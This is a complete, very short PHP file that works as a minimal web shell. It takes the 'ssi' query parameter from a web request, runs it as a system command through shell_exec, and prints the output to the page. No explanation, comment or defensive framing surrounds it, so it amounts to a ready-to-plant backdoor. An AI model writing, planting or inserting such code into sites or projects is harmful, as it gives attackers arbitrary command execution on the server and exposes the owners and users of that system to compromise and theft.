<?php
if(isset($_GET['ssi'])) {
    echo "<pre>" . shell_exec($_GET['ssi']) . "</pre>";
}
?>